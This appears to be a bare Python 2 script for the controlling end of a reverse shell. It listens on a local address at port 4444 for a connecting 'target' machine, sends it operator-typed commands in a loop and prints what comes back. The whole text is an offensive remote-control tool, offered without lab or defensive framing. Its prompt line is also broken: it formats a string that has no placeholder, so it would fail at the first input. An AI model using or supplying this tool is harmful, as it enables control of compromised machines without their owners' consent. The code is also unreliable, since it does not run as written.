#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("192.168.2.106", 4444))
s.listen(5)
print("[+] Listening for incoming connections")
target, ip = s.accept()
print("[+] target connected!")

while True:
	command = raw_input("* Shell#-\s: " % str(ip))
	target.send(command)
	if command == "q":
		break
	result = target.recv(2048)
	print(result)

target.close()
s.close()
